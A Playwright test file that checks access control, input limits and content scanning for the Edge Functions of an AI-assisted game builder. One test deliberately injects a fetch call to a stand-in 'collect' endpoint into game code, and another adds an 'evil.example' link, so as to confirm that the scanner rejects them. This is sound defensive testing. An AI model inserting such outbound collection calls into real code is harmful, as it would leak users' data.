import { expect, test } from '@playwright/test';
import { adminClient } from './accounts';
import { callAs, seedGame, streamAs, tinyGame, userClient } from './games';

// Edge Function behaviour that needs no model call (each request is refused before the AI is asked).

test('game-check fails code that contacts another website', async () => {
  const game = tinyGame();
  game.files['game.js'] += '\nfetch("https://x.y/collect");';
  const key = await seedGame('Leaky quiz', game);
  const { status, body } = await callAs('creator', 'game-check', { game_key: key });
  expect(status).toBe(200);
  expect(body.passed).toBe(false);
  expect((body.reasons as string[]).join(' ')).toContain('contacts another website');
});

test('game-check refuses someone who may not edit the game', async () => {
  const key = await seedGame('Private quiz', tinyGame());
  const { status } = await callAs('player', 'game-check', { game_key: key });
  expect(status).toBe(403);
});

const opponentGame = () => {
  const game = tinyGame();
  game.concept.aiRole = { kind: 'opponent', description: 'A cautious poker player who bluffs rarely', actions: ['raise', 'fold'] };
  return game;
};

async function testRun(gameKey: string): Promise<string> {
  const { client } = await userClient('creator');
  const { data, error } = await client.from('game_runs').insert({ game_key: gameKey, content_version: 0, test: true }).select('id').single();
  if (error) throw error;
  return data.id as string;
}

test('game-ai refuses a run that is not yours', async () => {
  const key = await seedGame('Poker test', opponentGame(), { secret: { strategy: 'fold on weak hands' } });
  const runId = await testRun(key);
  const { status } = await callAs('player', 'game-ai', { game_key: key, run_id: runId, messages: [{ role: 'player', text: 'Your move' }], state: {} });
  expect(status).toBe(403);
});

test('game-ai refuses a game without an AI role', async () => {
  const key = await seedGame('No AI quiz', tinyGame());
  const runId = await testRun(key);
  const { status, body } = await callAs('creator', 'game-ai', { game_key: key, run_id: runId, messages: [{ role: 'player', text: 'Hi' }], state: {} });
  expect(status).toBe(400);
  expect(body.error).toBe('This game has no AI role');
});

// Live AI: a few cents, only with E2E_LIVE_AI=1.
test('the AI opponent replies in role and only with allowed actions', async () => {
  test.skip(!process.env.E2E_LIVE_AI, 'set E2E_LIVE_AI=1 to call the real model');
  const key = await seedGame('Poker live', opponentGame(), { secret: { strategy: 'fold on weak hands, raise on pairs' } });
  const runId = await testRun(key);
  const { status, body } = await callAs('creator', 'game-ai', { game_key: key, run_id: runId, messages: [{ role: 'player', text: 'I raise. Your move.' }], state: { yourHand: ['2♣', '7♦'], pot: 40 } });
  expect(status).toBe(200);
  expect(typeof body.say).toBe('string');
  expect((body.say as string).length).toBeGreaterThan(0);
  expect([null, 'raise', 'fold']).toContain(body.action);
});

test('game-architect refuses an oversized or invalid concept before asking the AI', async () => {
  const key = await seedGame('Architect limits', { phase: 'design', brief: [{ role: 'creator', text: 'x' }], concept: null, mockup: null, files: null, data: null });
  const concept = { ...tinyGame().concept, howToPlay: Array.from({ length: 2000 }, () => 'x'.repeat(100)) };
  const { status } = await callAs('creator', 'game-architect', { game_key: key, brief: [{ role: 'creator', text: 'hi' }], concept, request: 'make it red', mode: 'revise' });
  expect(status).toBe(400);
  const bad = { ...tinyGame().concept, sources: ['made-up'] };
  const second = await callAs('creator', 'game-architect', { game_key: key, brief: [{ role: 'creator', text: 'hi' }], concept: bad, request: 'make it red', mode: 'revise' });
  expect(second.status).toBe(400);
});

test('game-content refuses a player', async () => {
  const key = await seedGame('Content refuse', tinyGame(), { publish: true });
  const { status } = await callAs('player', 'game-content', { game_key: key, data: tinyGame().data });
  expect(status).toBe(403);
});

test('game-content refuses content that drops what was there', async () => {
  const key = await seedGame('Content shape', tinyGame(), { publish: true });
  const { status, body } = await callAs('gameadmin', 'game-content', { game_key: key, data: { questions: tinyGame().data.questions.slice(0, 3) } });
  expect(status).toBe(400);
  expect(String(body.error)).toContain('lost items');
});

test('game-content fails the check for content with a web address', async () => {
  const key = await seedGame('Content scan', tinyGame(), { publish: true });
  const data = tinyGame().data;
  data.questions.push({ q: 'See https://evil.example', options: ['a', 'b'], answer: 0, source: 'p-number' });
  const { status, body } = await callAs('gameadmin', 'game-content', { game_key: key, data });
  expect(status).toBe(200);
  expect(body.passed).toBe(false);
  expect((body.reasons as string[]).join(' ')).toContain('contains a web address');
});

// Live AI: a few cents, only with E2E_LIVE_AI=1.
test('a game admin extends a game with AI and publishes it', async () => {
  test.skip(!process.env.E2E_LIVE_AI, 'set E2E_LIVE_AI=1 to call the real model');
  test.setTimeout(240_000);
  const key = await seedGame('Extend live', tinyGame(), { publish: true });
  const done = await streamAs('gameadmin', 'game-builder', { game_key: key, step: 'extend', instruction: 'Add two questions about the reverse-charge mention' });
  const questions = (done.data as { questions: unknown[] }).questions;
  expect(questions.length).toBeGreaterThanOrEqual(12);
  const { status, body } = await callAs('gameadmin', 'game-content', { game_key: key, data: done.data });
  expect(status).toBe(200);
  expect(body.passed).toBe(true);
});

async function playerRun(role: 'player' | 'player2', gameKey: string): Promise<string> {
  const { client } = await userClient(role);
  const { data, error } = await client.from('game_runs').insert({ game_key: gameKey, content_version: 1 }).select('id').single();
  if (error) throw error;
  return data.id as string;
}

test('game-ai lets a player with access through to the game (real run, no AI call)', async () => {
  const key = await seedGame('AI access open', tinyGame(), { publish: true });
  const runId = await playerRun('player', key);
  const { status, body } = await callAs('player', 'game-ai', { game_key: key, run_id: runId, messages: [{ role: 'player', text: 'Hi' }], state: {} });
  // Past the access check, the game has no AI role: proof can_play answered yes.
  expect(status).toBe(400);
  expect(body.error).toBe('This game has no AI role');
});

test('game-ai refuses a player who lost access to a restricted game', async () => {
  const key = await seedGame('AI access closed', tinyGame(), { publish: true });
  const runId = await playerRun('player2', key);
  await adminClient().from('games').update({ access: 'restricted' }).eq('key', key);
  const { status, body } = await callAs('player2', 'game-ai', { game_key: key, run_id: runId, messages: [{ role: 'player', text: 'Hi' }], state: {} });
  expect(status).toBe(403);
  expect(body.error).toBe('You don’t have access to this game');
});

test('game-content refuses an addition that adds nothing', async () => {
  const key = await seedGame('Content noop', tinyGame(), { publish: true });
  const { status, body } = await callAs('gameadmin', 'game-content', { game_key: key, data: tinyGame().data });
  expect(status).toBe(400);
  expect(String(body.error)).toContain('Nothing was added');
});

test('game-content refuses content generated on an older live version', async () => {
  const key = await seedGame('Content stale', tinyGame(), { publish: true });
  const data = tinyGame().data;
  data.questions.push({ q: 'New?', options: ['a', 'b'], answer: 0, source: 'p-number' });
  const { status, body } = await callAs('gameadmin', 'game-content', { game_key: key, data, based_on_version: 999 });
  expect(status).toBe(409);
  expect(String(body.error)).toContain('Generate again');
});
